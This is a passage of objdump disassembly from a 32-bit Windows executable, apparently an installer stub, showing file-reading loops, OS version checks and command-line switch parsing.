  4032ab:	e8 64 00 00 00       	call   0x403314
  4032b0:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4032b3:	74 11                	je     0x4032c6
  4032b5:	b8 50 a0 40 00       	mov    $0x40a050,%eax
  4032ba:	eb 51                	jmp    0x40330d
  4032bc:	6a 01                	push   $0x1
  4032be:	e8 82 fd ff ff       	call   0x403045
  4032c3:	59                   	pop    %ecx
  4032c4:	eb ef                	jmp    0x4032b5
  4032c6:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  4032ca:	89 35 30 9a 42 00    	mov    %esi,0x429a30
  4032d0:	8b 06                	mov    (%esi),%eax
  4032d2:	a3 38 9a 42 00       	mov    %eax,0x429a38
  4032d7:	74 06                	je     0x4032df
  4032d9:	ff 05 3c 9a 42 00    	incl   0x429a3c
  4032df:	6a 08                	push   $0x8
  4032e1:	8d 46 44             	lea    0x44(%esi),%eax
  4032e4:	59                   	pop    %ecx
  4032e5:	83 e8 08             	sub    $0x8,%eax
  4032e8:	01 30                	add    %esi,(%eax)
  4032ea:	49                   	dec    %ecx
  4032eb:	75 f8                	jne    0x4032e5
  4032ed:	6a 01                	push   $0x1
  4032ef:	57                   	push   %edi
  4032f0:	57                   	push   %edi
  4032f1:	53                   	push   %ebx
  4032f2:	ff 15 34 81 40 00    	call   *0x408134
  4032f8:	89 46 3c             	mov    %eax,0x3c(%esi)
  4032fb:	83 c6 04             	add    $0x4,%esi
  4032fe:	6a 40                	push   $0x40
  403300:	56                   	push   %esi
  403301:	68 40 9a 42 00       	push   $0x429a40
  403306:	e8 1c 2d 00 00       	call   0x406027
  40330b:	33 c0                	xor    %eax,%eax
  40330d:	5f                   	pop    %edi
  40330e:	5e                   	pop    %esi
  40330f:	5b                   	pop    %ebx
  403310:	c9                   	leave
  403311:	c2 04 00             	ret    $0x4
  403314:	55                   	push   %ebp
  403315:	8b ec                	mov    %esp,%ebp
  403317:	81 ec 90 00 00 00    	sub    $0x90,%esp
  40331d:	53                   	push   %ebx
  40331e:	56                   	push   %esi
  40331f:	8b 75 14             	mov    0x14(%ebp),%esi
  403322:	57                   	push   %edi
  403323:	8b 7d 10             	mov    0x10(%ebp),%edi
  403326:	89 75 f8             	mov    %esi,-0x8(%ebp)
  403329:	85 ff                	test   %edi,%edi
  40332b:	75 07                	jne    0x403334
  40332d:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  403334:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403338:	8b df                	mov    %edi,%ebx
  40333a:	85 ff                	test   %edi,%edi
  40333c:	75 05                	jne    0x403343
  40333e:	bb c0 8e 41 00       	mov    $0x418ec0,%ebx
  403343:	8b 45 08             	mov    0x8(%ebp),%eax
  403346:	85 c0                	test   %eax,%eax
  403348:	7c 0e                	jl     0x403358
  40334a:	8b 0d 78 9a 42 00    	mov    0x429a78,%ecx
  403350:	03 c8                	add    %eax,%ecx
  403352:	51                   	push   %ecx
  403353:	e8 b7 01 00 00       	call   0x40350f
  403358:	8d 45 14             	lea    0x14(%ebp),%eax
  40335b:	6a 04                	push   $0x4
  40335d:	50                   	push   %eax
  40335e:	e8 96 01 00 00       	call   0x4034f9
  403363:	85 c0                	test   %eax,%eax
  403365:	0f 84 45 01 00 00    	je     0x4034b0
  40336b:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  40336f:	0f 84 24 01 00 00    	je     0x403499
  403375:	ff 15 d0 80 40 00    	call   *0x4080d0
  40337b:	b9 30 ce 40 00       	mov    $0x40ce30,%ecx
  403380:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403383:	e8 43 37 00 00       	call   0x406acb
  403388:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  40338f:	8b 45 14             	mov    0x14(%ebp),%eax
  403392:	89 45 08             	mov    %eax,0x8(%ebp)
  403395:	0f 8e 54 01 00 00    	jle    0x4034ef
  40339b:	be 00 40 00 00       	mov    $0x4000,%esi
  4033a0:	39 75 14             	cmp    %esi,0x14(%ebp)
  4033a3:	7d 03                	jge    0x4033a8
  4033a5:	8b 75 14             	mov    0x14(%ebp),%esi
  4033a8:	bf c0 4e 41 00       	mov    $0x414ec0,%edi
  4033ad:	56                   	push   %esi
  4033ae:	57                   	push   %edi
  4033af:	e8 45 01 00 00       	call   0x4034f9
  4033b4:	85 c0                	test   %eax,%eax
  4033b6:	0f 84 f4 00 00 00    	je     0x4034b0
  4033bc:	29 75 14             	sub    %esi,0x14(%ebp)
  4033bf:	89 3d 48 ce 40 00    	mov    %edi,0x40ce48
  4033c5:	89 35 4c ce 40 00    	mov    %esi,0x40ce4c
  4033cb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4033ce:	b9 30 ce 40 00       	mov    $0x40ce30,%ecx
  4033d3:	89 1d 50 ce 40 00    	mov    %ebx,0x40ce50
  4033d9:	a3 54 ce 40 00       	mov    %eax,0x40ce54
  4033de:	e8 08 37 00 00       	call   0x406aeb
  4033e3:	85 c0                	test   %eax,%eax
  4033e5:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4033e8:	0f 8c a3 00 00 00    	jl     0x403491
  4033ee:	8b 35 50 ce 40 00    	mov    0x40ce50,%esi
  4033f4:	2b f3                	sub    %ebx,%esi
  4033f6:	ff 15 d0 80 40 00    	call   *0x4080d0
  4033fc:	f6 05 d4 9a 42 00 01 	testb  $0x1,0x429ad4
  403403:	8b f8                	mov    %eax,%edi
  403405:	74 49                	je     0x403450
  403407:	2b 45 f4             	sub    -0xc(%ebp),%eax
  40340a:	3d c8 00 00 00       	cmp    $0xc8,%eax
  40340f:	77 06                	ja     0x403417
  403411:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403415:	75 39                	jne    0x403450
  403417:	8b 45 08             	mov    0x8(%ebp),%eax
  40341a:	ff 75 08             	push   0x8(%ebp)
  40341d:	2b 45 14             	sub    0x14(%ebp),%eax
  403420:	6a 64                	push   $0x64
  403422:	50                   	push   %eax
  403423:	ff 15 48 81 40 00    	call   *0x408148
  403429:	50                   	push   %eax
  40342a:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  403430:	68 1c a2 40 00       	push   $0x40a21c
  403435:	50                   	push   %eax
  403436:	ff 15 2c 82 40 00    	call   *0x40822c
  40343c:	83 c4 0c             	add    $0xc,%esp
  40343f:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  403445:	50                   	push   %eax
  403446:	6a 00                	push   $0x0
  403448:	e8 b4 21 00 00       	call   0x405601
  40344d:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403450:	85 f6                	test   %esi,%esi
  403452:	74 31                	je     0x403485
  403454:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403458:	75 13                	jne    0x40346d
  40345a:	56                   	push   %esi
  40345b:	53                   	push   %ebx
  40345c:	ff 75 0c             	push   0xc(%ebp)
  40345f:	e8 ba 2c 00 00       	call   0x40611e
  403464:	85 c0                	test   %eax,%eax
  403466:	74 2d                	je     0x403495
  403468:	01 75 fc             	add    %esi,-0x4(%ebp)
  40346b:	eb 0c                	jmp    0x403479
  40346d:	01 75 fc             	add    %esi,-0x4(%ebp)
  403470:	29 75 f8             	sub    %esi,-0x8(%ebp)
  403473:	8b 1d 50 ce 40 00    	mov    0x40ce50,%ebx
  403479:	83 7d f0 01          	cmpl   $0x1,-0x10(%ebp)
  40347d:	0f 85 48 ff ff ff    	jne    0x4033cb
  403483:	eb 6a                	jmp    0x4034ef
  403485:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403489:	0f 8f 0c ff ff ff    	jg     0x40339b
  40348f:	eb 5e                	jmp    0x4034ef
  403491:	6a fc                	push   $0xfffffffc
  403493:	eb 1d                	jmp    0x4034b2
  403495:	6a fe                	push   $0xfffffffe
  403497:	eb 19                	jmp    0x4034b2
  403499:	85 ff                	test   %edi,%edi
  40349b:	74 47                	je     0x4034e4
  40349d:	39 75 14             	cmp    %esi,0x14(%ebp)
  4034a0:	7d 03                	jge    0x4034a5
  4034a2:	8b 75 14             	mov    0x14(%ebp),%esi
  4034a5:	56                   	push   %esi
  4034a6:	57                   	push   %edi
  4034a7:	e8 4d 00 00 00       	call   0x4034f9
  4034ac:	85 c0                	test   %eax,%eax
  4034ae:	75 3c                	jne    0x4034ec
  4034b0:	6a fd                	push   $0xfffffffd
  4034b2:	58                   	pop    %eax
  4034b3:	eb 3d                	jmp    0x4034f2
  4034b5:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4034b8:	39 75 14             	cmp    %esi,0x14(%ebp)
  4034bb:	7d 03                	jge    0x4034c0
  4034bd:	8b 75 14             	mov    0x14(%ebp),%esi
  4034c0:	bf c0 4e 41 00       	mov    $0x414ec0,%edi
  4034c5:	56                   	push   %esi
  4034c6:	57                   	push   %edi
  4034c7:	e8 2d 00 00 00       	call   0x4034f9
  4034cc:	85 c0                	test   %eax,%eax
  4034ce:	74 e0                	je     0x4034b0
  4034d0:	56                   	push   %esi
  4034d1:	57                   	push   %edi
  4034d2:	ff 75 0c             	push   0xc(%ebp)
  4034d5:	e8 44 2c 00 00       	call   0x40611e
  4034da:	85 c0                	test   %eax,%eax
  4034dc:	74 b7                	je     0x403495
  4034de:	01 75 fc             	add    %esi,-0x4(%ebp)
  4034e1:	29 75 14             	sub    %esi,0x14(%ebp)
  4034e4:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4034e8:	7f cb                	jg     0x4034b5
  4034ea:	eb 03                	jmp    0x4034ef
  4034ec:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4034ef:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4034f2:	5f                   	pop    %edi
  4034f3:	5e                   	pop    %esi
  4034f4:	5b                   	pop    %ebx
  4034f5:	c9                   	leave
  4034f6:	c2 10 00             	ret    $0x10
  4034f9:	ff 74 24 08          	push   0x8(%esp)
  4034fd:	ff 74 24 08          	push   0x8(%esp)
  403501:	ff 35 18 a0 40 00    	push   0x40a018
  403507:	e8 e3 2b 00 00       	call   0x4060ef
  40350c:	c2 08 00             	ret    $0x8
  40350f:	6a 00                	push   $0x0
  403511:	6a 00                	push   $0x0
  403513:	ff 74 24 0c          	push   0xc(%esp)
  403517:	ff 35 18 a0 40 00    	push   0x40a018
  40351d:	ff 15 34 81 40 00    	call   *0x408134
  403523:	c2 04 00             	ret    $0x4
  403526:	56                   	push   %esi
  403527:	be 00 68 43 00       	mov    $0x436800,%esi
  40352c:	56                   	push   %esi
  40352d:	e8 f8 32 00 00       	call   0x40682a
  403532:	56                   	push   %esi
  403533:	e8 8a 29 00 00       	call   0x405ec2
  403538:	85 c0                	test   %eax,%eax
  40353a:	75 02                	jne    0x40353e
  40353c:	5e                   	pop    %esi
  40353d:	c3                   	ret
  40353e:	56                   	push   %esi
  40353f:	e8 07 29 00 00       	call   0x405e4b
  403544:	56                   	push   %esi
  403545:	e8 e0 25 00 00       	call   0x405b2a
  40354a:	56                   	push   %esi
  40354b:	68 00 60 43 00       	push   $0x436000
  403550:	e8 46 2b 00 00       	call   0x40609b
  403555:	5e                   	pop    %esi
  403556:	c3                   	ret
  403557:	81 ec f8 03 00 00    	sub    $0x3f8,%esp
  40355d:	55                   	push   %ebp
  40355e:	56                   	push   %esi
  40355f:	57                   	push   %edi
  403560:	6a 20                	push   $0x20
  403562:	5f                   	pop    %edi
  403563:	33 ed                	xor    %ebp,%ebp
  403565:	68 01 80 00 00       	push   $0x8001
  40356a:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  40356e:	c7 44 24 18 d8 a2 40 	movl   $0x40a2d8,0x18(%esp)
  403575:	00 
  403576:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  40357a:	ff 15 a0 80 40 00    	call   *0x4080a0
  403580:	8b 35 a4 80 40 00    	mov    0x4080a4,%esi
  403586:	8d 44 24 34          	lea    0x34(%esp),%eax
  40358a:	50                   	push   %eax
  40358b:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  40358f:	89 ac 24 4c 01 00 00 	mov    %ebp,0x14c(%esp)
  403596:	89 ac 24 50 01 00 00 	mov    %ebp,0x150(%esp)
  40359d:	c7 44 24 38 1c 01 00 	movl   $0x11c,0x38(%esp)
  4035a4:	00 
  4035a5:	ff d6                	call   *%esi
  4035a7:	85 c0                	test   %eax,%eax
  4035a9:	75 38                	jne    0x4035e3
  4035ab:	8d 44 24 34          	lea    0x34(%esp),%eax
  4035af:	c7 44 24 34 14 01 00 	movl   $0x114,0x34(%esp)
  4035b6:	00 
  4035b7:	50                   	push   %eax
  4035b8:	ff d6                	call   *%esi
  4035ba:	66 8b 44 24 48       	mov    0x48(%esp),%ax
  4035bf:	8b 4c 24 62          	mov    0x62(%esp),%ecx
  4035c3:	66 2d 53 00          	sub    $0x53,%ax
  4035c7:	83 c1 d0             	add    $0xffffffd0,%ecx
  4035ca:	66 f7 d8             	neg    %ax
  4035cd:	1b c0                	sbb    %eax,%eax
  4035cf:	c6 84 24 4e 01 00 00 	movb   $0x4,0x14e(%esp)
  4035d6:	04 
  4035d7:	f7 d0                	not    %eax
  4035d9:	23 c1                	and    %ecx,%eax
  4035db:	66 89 84 24 48 01 00 	mov    %ax,0x148(%esp)
  4035e2:	00 
  4035e3:	83 7c 24 38 0a       	cmpl   $0xa,0x38(%esp)
  4035e8:	73 06                	jae    0x4035f0
  4035ea:	66 83 64 24 42 00    	andw   $0x0,0x42(%esp)
  4035f0:	8b 44 24 40          	mov    0x40(%esp),%eax
  4035f4:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  4035f9:	a3 d8 9a 42 00       	mov    %eax,0x429ad8
  4035fe:	33 c0                	xor    %eax,%eax
  403600:	8a 64 24 38          	mov    0x38(%esp),%ah
  403604:	0f b7 c0             	movzwl %ax,%eax
  403607:	0b c1                	or     %ecx,%eax
  403609:	33 c9                	xor    %ecx,%ecx
  40360b:	8a ac 24 48 01 00 00 	mov    0x148(%esp),%ch
  403612:	0f b7 c9             	movzwl %cx,%ecx
  403615:	c1 e0 10             	shl    $0x10,%eax
  403618:	0b c1                	or     %ecx,%eax
  40361a:	0f b6 8c 24 4e 01 00 	movzbl 0x14e(%esp),%ecx
  403621:	00 
  403622:	0b c1                	or     %ecx,%eax
  403624:	a3 dc 9a 42 00       	mov    %eax,0x429adc
  403629:	66 81 3d de 9a 42 00 	cmpw   $0x600,0x429ade
  403630:	00 06 
  403632:	74 11                	je     0x403645
  403634:	55                   	push   %ebp
  403635:	e8 36 33 00 00       	call   0x406970
  40363a:	3b c5                	cmp    %ebp,%eax
  40363c:	74 07                	je     0x403645
  40363e:	68 00 0c 00 00       	push   $0xc00
  403643:	ff d0                	call   *%eax
  403645:	be a8 82 40 00       	mov    $0x4082a8,%esi
  40364a:	56                   	push   %esi
  40364b:	e8 b0 32 00 00       	call   0x406900
  403650:	56                   	push   %esi
  403651:	ff 15 28 81 40 00    	call   *0x408128
  403657:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  40365b:	80 3e 00             	cmpb   $0x0,(%esi)
  40365e:	75 ea                	jne    0x40364a
  403660:	6a 0c                	push   $0xc
  403662:	e8 09 33 00 00       	call   0x406970
  403667:	6a 0a                	push   $0xa
  403669:	e8 02 33 00 00       	call   0x406970
  40366e:	6a 08                	push   $0x8
  403670:	a3 24 9a 42 00       	mov    %eax,0x429a24
  403675:	e8 f6 32 00 00       	call   0x406970
  40367a:	3b c5                	cmp    %ebp,%eax
  40367c:	74 0f                	je     0x40368d
  40367e:	6a 1e                	push   $0x1e
  403680:	ff d0                	call   *%eax
  403682:	85 c0                	test   %eax,%eax
  403684:	74 07                	je     0x40368d
  403686:	80 0d dc 9a 42 00 80 	orb    $0x80,0x429adc
  40368d:	53                   	push   %ebx
  40368e:	ff 15 38 80 40 00    	call   *0x408038
  403694:	55                   	push   %ebp
  403695:	ff 15 98 82 40 00    	call   *0x408298
  40369b:	a3 e0 9a 42 00       	mov    %eax,0x429ae0
  4036a0:	55                   	push   %ebp
  4036a1:	8d 84 24 58 01 00 00 	lea    0x158(%esp),%eax
  4036a8:	68 b4 02 00 00       	push   $0x2b4
  4036ad:	50                   	push   %eax
  4036ae:	55                   	push   %ebp
  4036af:	68 c8 0e 42 00       	push   $0x420ec8
  4036b4:	ff 15 7c 81 40 00    	call   *0x40817c
  4036ba:	68 bc a2 40 00       	push   $0x40a2bc
  4036bf:	68 20 8a 42 00       	push   $0x428a20
  4036c4:	e8 b3 2e 00 00       	call   0x40657c
  4036c9:	ff 15 a8 80 40 00    	call   *0x4080a8
  4036cf:	bb 00 40 43 00       	mov    $0x434000,%ebx
  4036d4:	50                   	push   %eax
  4036d5:	53                   	push   %ebx
  4036d6:	e8 a1 2e 00 00       	call   0x40657c
  4036db:	6a 22                	push   $0x22
  4036dd:	c7 05 20 9a 42 00 00 	movl   $0x400000,0x429a20
  4036e4:	00 40 00 
  4036e7:	5e                   	pop    %esi
  4036e8:	8b c3                	mov    %ebx,%eax
  4036ea:	66 39 35 00 40 43 00 	cmp    %si,0x434000
  4036f1:	75 07                	jne    0x4036fa
  4036f3:	8b fe                	mov    %esi,%edi
  4036f5:	b8 02 40 43 00       	mov    $0x434002,%eax
  4036fa:	57                   	push   %edi
  4036fb:	50                   	push   %eax
  4036fc:	e8 77 27 00 00       	call   0x405e78
  403701:	50                   	push   %eax
  403702:	ff 15 08 82 40 00    	call   *0x408208
  403708:	8b c8                	mov    %eax,%ecx
  40370a:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  40370e:	e9 f6 00 00 00       	jmp    0x403809
  403713:	6a 20                	push   $0x20
  403715:	5a                   	pop    %edx
  403716:	66 3b c2             	cmp    %dx,%ax
  403719:	75 07                	jne    0x403722
  40371b:	41                   	inc    %ecx
  40371c:	41                   	inc    %ecx
  40371d:	66 39 11             	cmp    %dx,(%ecx)
  403720:	74 f9                	je     0x40371b
  403722:	66 39 31             	cmp    %si,(%ecx)
  403725:	89 54 24 10          	mov    %edx,0x10(%esp)
  403729:	75 06                	jne    0x403731
  40372b:	41                   	inc    %ecx
  40372c:	89 74 24 10          	mov    %esi,0x10(%esp)
  403730:	41                   	inc    %ecx
  403731:	66 83 39 2f          	cmpw   $0x2f,(%ecx)
  403735:	0f 85 bb 00 00 00    	jne    0x4037f6
  40373b:	41                   	inc    %ecx
  40373c:	41                   	inc    %ecx
  40373d:	66 83 39 53          	cmpw   $0x53,(%ecx)
  403741:	75 18                	jne    0x40375b
  403743:	66 8b 41 02          	mov    0x2(%ecx),%ax
  403747:	66 3b c2             	cmp    %dx,%ax
  40374a:	74 05                	je     0x403751
  40374c:	66 3b c5             	cmp    %bp,%ax
  40374f:	75 0a                	jne    0x40375b
  403751:	c7 05 c0 9a 42 00 01 	movl   $0x1,0x429ac0
  403758:	00 00 00 
  40375b:	0f b7 05 b6 a2 40 00 	movzwl 0x40a2b6,%eax
  403762:	99                   	cltd
  403763:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403767:	c1 e0 10             	shl    $0x10,%eax
  40376a:	8b f8                	mov    %eax,%edi
  40376c:	33 f6                	xor    %esi,%esi
  40376e:	0f b7 05 b4 a2 40 00 	movzwl 0x40a2b4,%eax
  403775:	99                   	cltd
  403776:	0f b7 15 b0 a2 40 00 	movzwl 0x40a2b0,%edx
  40377d:	0b f8                	or     %eax,%edi
  40377f:	0f b7 05 b2 a2 40 00 	movzwl 0x40a2b2,%eax
  403786:	c1 e0 10             	shl    $0x10,%eax
  403789:	0b c2                	or     %edx,%eax
  40378b:	99                   	cltd
  40378c:	0b f0                	or     %eax,%esi
  40378e:	8b 01                	mov    (%ecx),%eax
  403790:	0b fa                	or     %edx,%edi
  403792:	3b c6                	cmp    %esi,%eax
  403794:	75 1b                	jne    0x4037b1
  403796:	8b 41 04             	mov    0x4(%ecx),%eax
  403799:	3b c7                	cmp    %edi,%eax
  40379b:	75 14                	jne    0x4037b1
  40379d:	66 8b 41 08          	mov    0x8(%ecx),%ax
  4037a1:	66 3d 20 00          	cmp    $0x20,%ax
  4037a5:	74 05                	je     0x4037ac
  4037a7:	66 3b c5             	cmp    %bp,%ax
  4037aa:	75 05                	jne    0x4037b1
  4037ac:	83 4c 24 14 04       	orl    $0x4,0x14(%esp)
  4037b1:	0f b7 05 aa a2 40 00 	movzwl 0x40a2aa,%eax
  4037b8:	99                   	cltd
  4037b9:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4037bd:	c1 e0 10             	shl    $0x10,%eax
  4037c0:	8b f8                	mov    %eax,%edi
  4037c2:	33 f6                	xor    %esi,%esi
  4037c4:	0f b7 05 a8 a2 40 00 	movzwl 0x40a2a8,%eax
  4037cb:	99                   	cltd
  4037cc:	0f b7 15 a4 a2 40 00 	movzwl 0x40a2a4,%edx
  4037d3:	0b f8                	or     %eax,%edi
  4037d5:	0f b7 05 a6 a2 40 00 	movzwl 0x40a2a6,%eax
  4037dc:	c1 e0 10             	shl    $0x10,%eax
  4037df:	0b c2                	or     %edx,%eax
  4037e1:	99                   	cltd
  4037e2:	0b f0                	or     %eax,%esi
  4037e4:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4037e7:	0b fa                	or     %edx,%edi
  4037e9:	3b c6                	cmp    %esi,%eax
  4037eb:	75 06                	jne    0x4037f3
  4037ed:	8b 01                	mov    (%ecx),%eax
  4037ef:	3b c7                	cmp    %edi,%eax
  4037f1:	74 24                	je     0x403817
  4037f3:	6a 22                	push   $0x22
  4037f5:	5e                   	pop    %esi
  4037f6:	ff 74 24 10          	push   0x10(%esp)
  4037fa:	51                   	push   %ecx
  4037fb:	e8 78 26 00 00       	call   0x405e78
  403800:	8b c8                	mov    %eax,%ecx
  403802:	66 39 31             	cmp    %si,(%ecx)
  403805:	75 02                	jne    0x403809
  403807:	41                   	inc    %ecx
  403808:	41                   	inc    %ecx
  403809:	66 8b 01             	mov    (%ecx),%ax
  40380c:	66 3b c5             	cmp    %bp,%ax
  40380f:	0f 85 fe fe ff ff    	jne    0x403713
  403815:	eb 12                	jmp    0x403829
  403817:	66 89 69 fc          	mov    %bp,-0x4(%ecx)
  40381b:	83 c1 04             	add    $0x4,%ecx
  40381e:	51                   	push   %ecx
  40381f:	68 00 48 43 00       	push   $0x434800
  403824:	e8 53 2d 00 00       	call   0x40657c
  403829:	8b 3d ac 80 40 00    	mov    0x4080ac,%edi
  40382f:	be 00 68 43 00       	mov    $0x436800,%esi
  403834:	56                   	push   %esi
  403835:	68 00 04 00 00       	push   $0x400
  40383a:	ff d7                	call   *%edi
  40383c:	e8 e5 fc ff ff       	call   0x403526
  403841:	85 c0                	test   %eax,%eax
  403843:	75 56                	jne    0x40389b
  403845:	68 fb 03 00 00       	push   $0x3fb
  40384a:	56                   	push   %esi
  40384b:	ff 15 b0 80 40 00    	call   *0x4080b0
  403851:	68 98 a2 40 00       	push   $0x40a298
  403856:	56                   	push   %esi
  403857:	e8 3c 2d 00 00       	call   0x406598
  40385c:	e8 c5 fc ff ff       	call   0x403526
  403861:	85 c0                	test   %eax,%eax
  403863:	75 36                	jne    0x40389b
  403865:	56                   	push   %esi
  403866:	68 fc 03 00 00       	push   $0x3fc
  40386b:	ff d7                	call   *%edi
  40386d:	68 90 a2 40 00       	push   $0x40a290
  403872:	56                   	push   %esi
  403873:	e8 20 2d 00 00       	call   0x406598
  403878:	8b 3d b4 80 40 00    	mov    0x4080b4,%edi
  40387e:	56                   	push   %esi
  40387f:	68 84 a2 40 00       	push   $0x40a284
  403884:	ff d7                	call   *%edi
  403886:	56                   	push   %esi
  403887:	68 7c a2 40 00       	push   $0x40a27c
  40388c:	ff d7                	call   *%edi
  40388e:	e8 93 fc ff ff       	call   0x403526
  403893:	85 c0                	test   %eax,%eax
  403895:	0f 84 07 02 00 00    	je     0x403aa2
  40389b:	68 00 60 43 00       	push   $0x436000
  4038a0:	ff 15 44 81 40 00    	call   *0x408144
  4038a6:	ff 74 24 14          	push   0x14(%esp)
  4038aa:	e8 fa f7 ff ff       	call   0x4030a9
  4038af:	3b c5                	cmp    %ebp,%eax
  4038b1:	89 44 24 18          	mov    %eax,0x18(%esp)
  4038b5:	0f 85 e7 01 00 00    	jne    0x403aa2
  4038bb:	39 2d 3c 9a 42 00    	cmp    %ebp,0x429a3c
  4038c1:	0f 84 93 00 00 00    	je     0x40395a
  4038c7:	55                   	push   %ebp
  4038c8:	53                   	push   %ebx
  4038c9:	e8 aa 25 00 00       	call   0x405e78
  4038ce:	8b f8                	mov    %eax,%edi
  4038d0:	3b fb                	cmp    %ebx,%edi
  4038d2:	72 4c                	jb     0x403920
  4038d4:	0f b7 05 76 a2 40 00 	movzwl 0x40a276,%eax
  4038db:	99                   	cltd
  4038dc:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4038e0:	c1 e0 10             	shl    $0x10,%eax
  4038e3:	8b e8                	mov    %eax,%ebp
  4038e5:	0f b7 05 74 a2 40 00 	movzwl 0x40a274,%eax
  4038ec:	0f b7 0d 70 a2 40 00 	movzwl 0x40a270,%ecx
  4038f3:	99                   	cltd
  4038f4:	0b e8                	or     %eax,%ebp
  4038f6:	0f b7 05 72 a2 40 00 	movzwl 0x40a272,%eax
  4038fd:	c1 e0 10             	shl    $0x10,%eax
  403900:	0b c1                	or     %ecx,%eax
  403902:	33 c9                	xor    %ecx,%ecx
  403904:	99                   	cltd
  403905:	0b c8                	or     %eax,%ecx
  403907:	8b c5                	mov    %ebp,%eax
  403909:	0b c2                	or     %edx,%eax
  40390b:	8b 17                	mov    (%edi),%edx
  40390d:	3b d1                	cmp    %ecx,%edx
  40390f:	75 07                	jne    0x403918
  403911:	8b 57 04             	mov    0x4(%edi),%edx
  403914:	3b d0                	cmp    %eax,%edx
  403916:	74 06                	je     0x40391e
  403918:	4f                   	dec    %edi
  403919:	4f                   	dec    %edi
  40391a:	3b fb                	cmp    %ebx,%edi
  40391c:	73 ed                	jae    0x40390b
  40391e:	33 ed                	xor    %ebp,%ebp
  403920:	3b fb                	cmp    %ebx,%edi
  403922:	c7 44 24 18 e8 a1 40 	movl   $0x40a1e8,0x18(%esp)
  403929:	00 
  40392a:	72 43                	jb     0x40396f
  40392c:	66 89 2f             	mov    %bp,(%edi)
  40392f:	83 c7 08             	add    $0x8,%edi
  403932:	57                   	push   %edi
  403933:	e8 1b 26 00 00       	call   0x405f53
  403938:	85 c0                	test   %eax,%eax
  40393a:	0f 84 62 01 00 00    	je     0x403aa2
  403940:	57                   	push   %edi
  403941:	68 00 48 43 00       	push   $0x434800
  403946:	e8 31 2c 00 00       	call   0x40657c
  40394b:	57                   	push   %edi
  40394c:	68 00 50 43 00       	push   $0x435000
  403951:	e8 26 2c 00 00       	call   0x40657c
  403956:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40395a:	83 0d cc 9a 42 00 ff 	orl    $0xffffffff,0x429acc
  403961:	e8 e8 02 00 00       	call   0x403c4e
  403966:	89 44 24 20          	mov    %eax,0x20(%esp)
  40396a:	e9 33 01 00 00       	jmp    0x403aa2
  40396f:	e8 d3 21 00 00       	call   0x405b47
  403974:	56                   	push   %esi
  403975:	89 44 24 28          	mov    %eax,0x28(%esp)
  403979:	e8 14 2c 00 00       	call   0x406592
  40397e:	ff 74 24 1c          	push   0x1c(%esp)
  403982:	8b f8                	mov    %eax,%edi
  403984:	68 00 a0 42 00       	push   $0x42a000
  403989:	e8 ee 2b 00 00       	call   0x40657c
  40398e:	66 39 2d 00 48 43 00 	cmp    %bp,0x434800
  403995:	75 0f                	jne    0x4039a6
  403997:	68 00 58 43 00       	push   $0x435800
  40399c:	68 00 48 43 00       	push   $0x434800
  4039a1:	e8 d6 2b 00 00       	call   0x40657c
  4039a6:	8d 04 7d 00 68 43 00 	lea    0x436800(,%edi,2),%eax
  4039ad:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  4039b4:	00 
  4039b5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4039b9:	bf 00 c8 42 00       	mov    $0x42c800,%edi
  4039be:	bb 00 d0 42 00       	mov    $0x42d000,%ebx
  4039c3:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4039c7:	0f b7 6c 24 14       	movzwl 0x14(%esp),%ebp
  4039cc:	55                   	push   %ebp
  4039cd:	68 58 a2 40 00       	push   $0x40a258
  4039d2:	ff 74 24 24          	push   0x24(%esp)
  4039d6:	ff 15 2c 82 40 00    	call   *0x40822c
  4039dc:	a1 30 9a 42 00       	mov    0x429a30,%eax
  4039e1:	83 c4 0c             	add    $0xc,%esp
  4039e4:	ff b0 20 01 00 00    	push   0x120(%eax)
  4039ea:	57                   	push   %edi
  4039eb:	e8 c9 2b 00 00       	call   0x4065b9
  4039f0:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  4039f5:	56                   	push   %esi
  4039f6:	74 07                	je     0x4039ff
  4039f8:	e8 d3 20 00 00       	call   0x405ad0
  4039fd:	eb 05                	jmp    0x403a04
  4039ff:	e8 26 21 00 00       	call   0x405b2a
  403a04:	85 c0                	test   %eax,%eax
  403a06:	74 3a                	je     0x403a42
  403a08:	57                   	push   %edi
  403a09:	ff 15 dc 80 40 00    	call   *0x4080dc
  403a0f:	f6 c4 04             	test   $0x4,%ah
  403a12:	75 1f                	jne    0x403a33
  403a14:	57                   	push   %edi
  403a15:	ff 15 44 81 40 00    	call   *0x408144
  403a1b:	85 c0                	test   %eax,%eax
  403a1d:	74 14                	je     0x403a33
  403a1f:	6a 01                	push   $0x1
  403a21:	56                   	push   %esi
  403a22:	e8 61 22 00 00       	call   0x405c88
  403a27:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a2b:	ff 44 24 10          	incl   0x10(%esp)
